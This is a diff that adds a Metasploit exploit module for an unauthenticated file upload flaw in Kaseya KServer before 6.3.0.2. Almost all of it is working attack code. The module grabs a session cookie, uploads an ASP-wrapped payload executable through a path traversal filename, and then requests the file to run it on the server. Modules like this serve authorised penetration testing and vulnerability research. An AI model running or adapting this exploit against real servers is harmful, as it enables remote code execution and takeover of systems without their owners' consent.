@@ -1,0 +1,104 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Kaseya uploadImage Arbitrary File Upload',
+      'Description'    => %q{
+        This module exploits an arbitrary file upload vulnerability found in Kaseya versions below
+        6.3.0.2. A malicious user can upload an ASP file to an arbitrary directory without previous
+        authentication, leading to arbitrary code execution with IUSR privileges.
+      },
+      'Author'         =>
+        [
+          'Thomas Hibbert <thomas.hibbert@security-assessment.com' # Vulnerability discovery and MSF module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['OSVDB', '99984'],
+          ['BID', '63782'],
+          ['EDB', '29675'],
+          ['URL', 'http://security-assessment.com/files/documents/advisory/Kaseya%20File%20Upload.pdf']
+        ],
+      'Platform'       => 'win',
+      'Arch'           => ARCH_X86,
+      'Privileged'     => false,
+      'Targets'        =>
+        [
+          [ 'Kaseya KServer / Windows', {} ],
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Nov 11 2013'))
+  end
+
+  def check
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri('SystemTab','uploadImage.asp')
+    })
+
+    # the vuln was patched by removing uploadImage.asp. if the page is there, calling it without params will return 500, else 404
+    unless res and res.code == 500
+      return Exploit::CheckCode::Unknown
+    end
+
+    return Exploit::CheckCode::Appears
+  end
+
+  def exploit
+    print_status("#{peer} - Getting cookie...")
+    res = send_request_cgi({
+       'method' => 'GET',
+       'uri'    => normalize_uri("SystemTab", "uploadImage.asp")
+    })
+
+    unless res and res.code == 500 and res.headers and res.headers.include?('Set-Cookie')
+      fail_with(Exploit::Failure::Unknown, "#{peer} - Failed to get cookie")
+    end
+
+    cookie = res.get_cookies
+    @payload_name = "#{rand_text_alpha_lower(8)}.asp"
+    exe  = generate_payload_exe
+    asp  = Msf::Util::EXE.to_exe_asp(exe)
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(asp, "application/octet-stream", nil, "form-data; name=\"uploadFile\"; filename=\"#{@payload_name}")
+    data = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')
+
+    print_status("#{peer} - Uploading payload...")
+    res = send_request_cgi({
+      "method" => "POST",
+      "uri"    => normalize_uri("SystemTab", "uploadImage.asp"),
+      "vars_get" => {
+        "filename" => "..\\..\\..\\..\\#{@payload_name}"
+      },
+      "data"   => data,
+      "ctype"  => "multipart/form-data; boundary=#{post_data.bound}",
+      "cookie" => cookie
+    })
+
+    unless res and res.code == 200
+      fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
+    end
+
+    register_files_for_cleanup(@payload_name)
+
+    print_status("#{peer} - Executing payload #{@payload_name}")
+    res = send_request_cgi({
+      'uri'    => normalize_uri(@payload_name),
+      'method' => 'GET'
+    })
+  end
+end
